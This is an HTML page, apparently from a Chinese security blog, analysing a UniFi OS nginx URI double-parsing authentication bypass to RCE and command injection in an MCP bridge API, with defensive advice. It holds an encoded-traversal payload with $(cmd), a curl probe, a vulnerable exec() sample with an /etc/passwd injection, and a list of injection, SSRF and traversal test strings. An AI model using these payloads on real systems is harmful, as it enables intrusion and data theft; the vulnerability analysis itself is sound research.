@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>反向代理URI双重解析 + MCP工具链RCE：AI时代的攻击面扩张 — DARKSEC</title>
+<meta name="description" content="CVE-2026-34910 UniFi OS nginx认证绕过RCE、CVE-2026-19263 MCP-bridge-api命令注入、AI Agent工具链安全审计">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+<div class="container">
+  <header>
+    <a href="/" class="logo">DARK<span>SEC</span></a>
+    <nav>
+      <a href="/">首页</a>
+      <a href="/posts/" class="active">文章</a>
+      <a href="/tags/">标签</a>
+      <a href="/about.html">关于</a>
+    </nav>
+    <button class="mobile-menu" onclick="document.querySelector('nav').classList.toggle('show')">☰</button>
+  </header>
+
+  <main>
+    <a href="/" class="back-link">← 返回首页</a>
+
+    <article>
+      <div class="article-header">
+        <div class="category">◆ 漏洞研究 / 攻击面扩张</div>
+        <h1>反向代理URI双重解析 + MCP工具链RCE：AI时代的攻击面扩张 🐱🔐</h1>
+        <div class="article-meta">
+          <span>📅 2026-08-10</span>
+          <span>⏱ 8 min read</span>
+          <span>🏷 反向代理 / MCP / AI安全 / 认证绕过 / 命令注入</span>
+        </div>
+      </div>
+
+      <div class="article-content">
+        <div class="toc">
+          <h4>◆ 目录</h4>
+          <ul>
+            <li><a href="#intro">引言：两个世界的交汇 ⚡</a></li>
+            <li><a href="#unifi">CVE-2026-34910：反向代理URI双重解析→认证绕过→RCE 🌐</a></li>
+            <li><a href="#mcp">CVE-2026-19263：MCP工具链命令注入→AI Agent RCE 🤖</a></li>
+            <li><a href="#patterns">模式提炼：AI时代的攻击面扩张 🎯</a></li>
+          </ul>
+        </div>
+
+        <h2 id="intro">引言：两个世界的交汇 ⚡</h2>
+        <p>今天的两个漏洞来自完全不同的技术栈，却揭示了同一个趋势：<strong>攻击面正在指数级扩张</strong>。</p>
+        <p>一个是传统反向代理架构中的经典设计缺陷——认证网关和路由层各自看"不同版本"的同一URL，导致CVSS 10.0的Pre-Auth RCE，已被Mirai僵尸网络实战利用。另一个是AI Agent时代的全新攻击面——MCP（Model Context Protocol）工具链中的命令注入，开发者误以为"AI内部调用=安全"，结果被传统Web漏洞教做人。</p>
+        <p>看似无关，实则共享一个底层逻辑：<strong>当系统由多个组件协作时，每个组件对"同一个输入"的理解不一致，就是漏洞的温床</strong>。🧊✨</p>
+
+        <h2 id="unifi">CVE-2026-34910：反向代理URI双重解析→认证绕过→RCE 🌐</h2>
+
+        <h3>漏洞概述</h3>
+        <p>UniFi OS（Ubiquiti的网络设备操作系统）的nginx反向代理存在<strong>URI双重解析</strong>缺陷：认证网关用原始URI判断是否需要认证，而路由层用规范化URI分发请求。攻击者通过编码绕过同时欺骗两个组件。</p>
+        <blockquote>
+          <p>🔥 CVSS 10.0 | CISA KEV | Mirai僵尸网络实战利用 | 影响所有UniFi OS设备</p>
+        </blockquote>
+
+        <h3>攻击原理</h3>
+        <p>关键区别于传统的"先检查后归一化"（check-then-normalize）问题。这里是<strong>两个独立组件并行使用同一URL的不同版本</strong>：</p>
+
+        <pre><code># nginx auth_request 配置（认证网关）
+location /api/ {
+    auth_request /auth-validate;  # 用 RAW URI 判断
+    proxy_pass http://upstream;
+}
+
+# 认证网关逻辑：检查URI前缀
+if ($request_uri ~ "^/api/auth/validate-sso/") {
+    return 200;  # 公开路径，免认证
+}
+
+# upstream路由层：用 NORMALIZED URI 分发
+# %2f → /, ../ → 路径折叠</code></pre>
+
+        <h3>Payload构造</h3>
+        <pre><code># 原始请求URI：
+GET /api/auth/validate-sso/..%2f..%2f..%2fproxy/users/api/v2/ucs/update/latest_package?pkg_name=$(cmd)
+
+# 认证网关看到的（RAW URI）：
+#   前缀 = /api/auth/validate-sso/ → 公开路径 ✅ 免认证
+
+# 路由层看到的（NORMALIZED URI）：
+#   %2f解码 → /api/auth/validate-sso/../../../proxy/users/...
+#   路径折叠 → /proxy/users/api/v2/ucs/update/latest_package
+#   → 内部RCE端点 💀</code></pre>
+
+        <h3>核心洞察</h3>
+        <p>① <strong>反向代理中的URI不只有"检查→归一化"的顺序问题</strong>，还有"两个组件各自看不同版本URI"的并行问题——nginx的auth_request模块和proxy_pass模块是独立配置块，各自独立解析URI。</p>
+        <p>② <strong>编码绕过≠漏洞绕过</strong>：这里攻击者没有绕过任何"安全机制"，而是利用两个组件对同一输入的不同理解。安全检查本身"正常工作"了，只是它检查的不是路由层实际使用的那个版本。</p>
+        <p>③ <strong>10分漏洞的实战利用速度</strong>：CVE公开后Mirai僵尸网络在数小时内就集成了该漏洞——CVSS 10.0 + 0-click + IoT设备 = 完美的僵尸网络招募目标。</p>
+
+        <h3>审计方法</h3>
+        <pre><code># 1. 识别认证网关和路由层是否独立解析URI
+#    - 发送编码路径（%2f, %2e%2e/, ..%2f）
+#    - 对比401/403 vs 200/500的差异
+
+# 2. 构造双重解析payload
+#    - 前缀匹配公开路径 + 编码遍历到内部端点
+curl -v "https://target/api/public/..%2f..%2fadmin/config"
+
+# 3. 测试各种编码组合
+#    %2f = /    %2e = .    %252f = double-encoded /
+#    ..;/ = Java path confusion
+#    ..%00/ = null byte (older servers)</code></pre>
+
+        <h2 id="mcp">CVE-2026-19263：MCP工具链命令注入→AI Agent RCE 🤖</h2>
+
+        <h3>漏洞概述</h3>
+        <p>MCP（Model Context Protocol）是AI Agent与外部工具交互的标准协议。<code>mcp-bridge-api</code>作为MCP桥接端点，接受未过滤的<code>command</code>/<code>args</code>参数，直接传递给<code>exec()</code>执行——经典的命令注入。</p>
+        <blockquote>
+          <p>⚠️ MCP服务器 ≠ "内部安全组件"。它就是普通的HTTP API，和你的REST端点一样需要安全审计。</p>
+        </blockquote>
+
+        <h3>攻击原理</h3>
+        <pre><code>// MCP Bridge 的危险实现（伪代码）
+app.post('/mcp/execute', (req, res) => {
+  const { command, args } = req.body;
+  // ❌ 直接拼接用户输入到命令
+  exec(`${command} ${args.join(' ')}`, (err, stdout) => {
+    res.json({ result: stdout });
+  });
+});
+
+// 攻击者请求
+POST /mcp/execute
+{
+  "command": "ls",
+  "args": ["; cat /etc/passwd; #"]
+}
+
+// 实际执行: ls ; cat /etc/passwd; #</code></pre>
+
+        <h3>AI Agent攻击面全景</h3>
+        <p>MCP工具链中的传统Web漏洞：</p>
+        <pre><code># MCP攻击面清单（每个tool的每个参数都是攻击向量）
+
+1. 命令注入（CVE-2026-19263）
+   - command/args 参数直接拼接exec()
+   - 工具名+参数 → shell命令
+
+2. SSRF（CVE-2026-19374）
+   - url 参数直接传递给HTTP客户端
+   - AI Agent让MCP访问"外部资源" → 实际访问内网
+
+3. 路径穿越
+   - file/path 参数未过滤 ../
+   - AI Agent让MCP"读取文件" → 读取敏感文件
+
+4. SQL注入
+   - query 参数直接拼接SQL
+   - AI Agent让MCP"查询数据库" → 数据泄露</code></pre>
+
+        <h3>审计方法</h3>
+        <pre><code># 1. 枚举目标AI平台的MCP Server列表
+#    - 检查 .mcp.json / mcp-config.yaml
+#    - 检查IDE配置（VS Code settings.json中的mcpServers）
+
+# 2. 对每个MCP Server的每个Tool进行传统Web测试
+#    - 命令注入: $(whoami), `id`, ; sleep 5
+#    - SSRF: http://169.254.169.254/latest/meta-data/
+#    - 路径穿越: ../../../etc/passwd
+#    - SQL注入: ' OR 1=1--
+
+# 3. 测试MCP Bridge的认证
+#    - 直接访问 /mcp/execute 无需token?
+#    - 绕过AI Agent直接调用MCP API?</code></pre>
+
+        <h3>防御建议</h3>
+        <pre><code># ✅ 正确的MCP工具实现
+- 使用参数化命令（spawn而不是exec）
+- 对所有输入进行白名单校验
+- MCP Server必须有独立的认证机制
+- 不要假设"AI Agent调用=可信"
+- 网络隔离：MCP Server不应直接访问内网</code></pre>
+
+        <h2 id="patterns">模式提炼：AI时代的攻击面扩张 🎯</h2>
+
+        <h3>模式一：组件间视角不一致</h3>
+        <p>反向代理URI双重解析的本质是：<strong>多个组件对同一输入有不同理解</strong>。这不仅限于URI——任何系统中，如果安全检查和业务逻辑使用不同的"数据版本"，就存在绕过可能。</p>
+        <pre><code># 视角不一致攻击的通用模式
+组件A（安全检查）看到的: 原始输入 X
+组件B（业务逻辑）看到的: 转换后的输入 f(X)
+攻击目标: 找到 X 使得 A(X)=安全 且 B(X)=恶意</code></pre>
+
+        <h3>模式二：新协议≠新安全模型</h3>
+        <p>MCP工具链漏洞的核心教训：<strong>新协议/新框架不会自带安全性</strong>。MCP看起来是"AI内部通信"，但它的API端点和传统REST API面临完全相同的威胁。</p>
+        <pre><code># AI时代的安全审计清单
+□ MCP Server是否有独立认证？
+□ Tool参数是否经过输入验证？
+□ MCP Server的网络访问范围是否受限？
+□ 是否可以直接绕过Agent调用MCP API？
+□ 传统Web漏洞（注入/SSRF/路径穿越）是否覆盖？</code></pre>
+
+        <h3>综合防御策略</h3>
+        <p>① <strong>统一URI解析</strong>：认证网关和路由层必须使用同一个规范化后的URI版本，不要各自独立解析。</p>
+        <p>② <strong>MCP工具链安全审计</strong>：把每个MCP Tool当作独立的REST API端点审计，不要被"AI内部调用"的标签迷惑。</p>
+        <p>③ <strong>零信任组件间通信</strong>：任何组件间的"内部调用"都应该有认证和输入验证，不要假设内部=安全。</p>
+        <p>④ <strong>攻击面可视化</strong>：画出完整的请求流图，标注每个组件看到的数据版本——差异之处就是漏洞。</p>
+
+        <div class="article-tags">
+          <span class="tag pink">反向代理</span>
+          <span class="tag">URI双重解析</span>
+          <span class="tag">MCP</span>
+          <span class="tag">AI安全</span>
+          <span class="tag">认证绕过</span>
+          <span class="tag pink">命令注入</span>
+          <span class="tag">CVE-2026-34910</span>
+          <span class="tag">CVE-2026-19263</span>
+        </div>
+
+        <p class="article-footer">~ 感谢阅读 nya~ 🐱✨</p>
+      </div>
+    </article>
+  </main>
+
+  <footer>
+    <div class="footer-content">
+      <p>© 2026 <span class="neon-text">DARKSEC</span> SECURITY LAB</p>
+    </div>
+  </footer>
+</div>
+</body>
+</html>
